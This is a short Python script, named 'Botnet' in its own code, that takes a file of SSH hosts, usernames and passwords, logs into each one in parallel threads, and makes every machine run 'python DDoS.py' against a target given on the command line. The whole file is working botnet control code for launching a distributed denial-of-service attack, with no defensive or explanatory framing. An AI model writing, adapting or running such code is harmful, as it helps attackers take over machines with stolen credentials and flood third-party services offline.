from pexpect import pxssh
import threading
import sys


class Botnet:
    def __init__(self, host, user, password, cmd):
        self.host = host
        self.user = user
        self.password = password

        self.session = self.login()
        if self.session:
            self.sendCommand(cmd)

    def login(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            return False

    def sendCommand(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()

        print("-" * 50)
        print()
        print()

        print("commands' output ".format(self.user, self.host))
        print(self.session.before)


if __name__ == "__main__":
    with open(sys.argv[1], "r") as file:
        ssh_list = file.readlines()

    for i in ssh_list:
        t = threading.Thread(target=Botnet, args=(i.strip("\n").split(",")[0], i.strip("\n").split(",")[1],
                                                  i.strip("\n").split(",")[2],
                                                  "python DDoS.py " + sys.argv[2] + " " +
                                                  sys.argv[3] + " " + sys.argv[4]))
        t.start()
